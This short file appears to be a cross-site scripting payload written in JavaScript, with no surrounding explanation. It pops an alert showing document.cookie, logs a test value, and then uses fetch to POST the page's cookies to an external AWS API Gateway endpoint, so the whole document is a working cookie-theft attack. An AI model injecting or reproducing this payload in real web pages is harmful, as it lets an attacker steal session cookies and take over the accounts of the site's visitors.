alert(document.cookie)
console.log(1)
fetch('https://xtzm981uvg.execute-api.us-east-1.amazonaws.com/default/invoke',{
  method: 'POST',
  headers: {
    'Content-Type': 'application/json'
  },
  body: JSON.stringify(document.cookie)
})
